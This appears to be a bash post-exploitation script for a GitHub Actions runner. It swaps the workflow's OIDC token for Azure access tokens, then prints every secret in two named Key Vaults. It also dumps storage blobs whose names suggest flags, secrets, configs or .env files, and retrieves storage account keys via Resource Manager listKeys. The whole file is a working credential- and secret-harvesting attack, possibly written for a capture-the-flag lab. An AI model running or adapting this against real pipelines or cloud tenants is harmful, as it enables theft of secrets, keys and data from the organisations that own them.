#!/usr/bin/env bash
set -uo pipefail
MS="x-ms-version: 2021-08-06"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
tok(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }

echo "########## KEY VAULTS ##########"
KV=$(tok "https://vault.azure.net/.default")
for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  echo "== $V =="
  L=$(curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4")
  echo "$L" | jq -r 'if .value then (.value[].id) else ("ERR "+ .error.code) end' 2>/dev/null || echo "$L" | head -c 200
  for id in $(echo "$L" | jq -r '.value[]?.id' 2>/dev/null); do
    echo "--- $id ---"; curl -sS -H "Authorization: Bearer $KV" "$id?api-version=7.4" | jq -r '.value'
  done
done

echo "########## STORAGE (AAD blob) ##########"
ST=$(tok "https://storage.azure.com/.default")
for ACCT in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "===== $ACCT ====="
  CT=$(curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$ACCT.blob.core.windows.net/?comp=list")
  conts=$(echo "$CT" | grep -oE '<Name>[^<]+</Name>' | sed -E 's#</?Name>##g')
  if [ -z "$conts" ]; then echo "  (no containers) $(echo "$CT" | grep -oE '<Code>[^<]+' | head -1)"; continue; fi
  for c in $conts; do
    echo "  [container] $c"
    BL=$(curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$ACCT.blob.core.windows.net/$c?restype=container&comp=list")
    blobs=$(echo "$BL" | grep -oE '<Name>[^<]+</Name>' | sed -E 's#</?Name>##g')
    echo "$blobs" | sed 's/^/     blob: /'
    for b in $blobs; do
      case "$b" in
        *flag*|*FLAG*|*.json|*.txt|*config*|*secret*|*.env)
          echo "     >>> $c/$b:"; curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$ACCT.blob.core.windows.net/$c/$b"; echo ;;
      esac
    done
  done
done

echo "########## ARM listKeys (fallback neu blob 403) ##########"
ARM=$(tok "https://management.azure.com/.default")
RES=$(curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01")
for ACCT in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  RID=$(echo "$RES" | jq -r ".value[]|select(.name==\"$ACCT\" and (.type|test(\"storageAccounts\")))|.id")
  echo "== listKeys $ACCT =="
  [ -z "$RID" ] && { echo "  (RID not found)"; continue; }
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
    "https://management.azure.com$RID/listKeys?api-version=2023-01-01" \
    | jq -r 'if .keys then ("KEY0="+.keys[0].value) else ("ERR "+(.error.code//"?")) end'
done
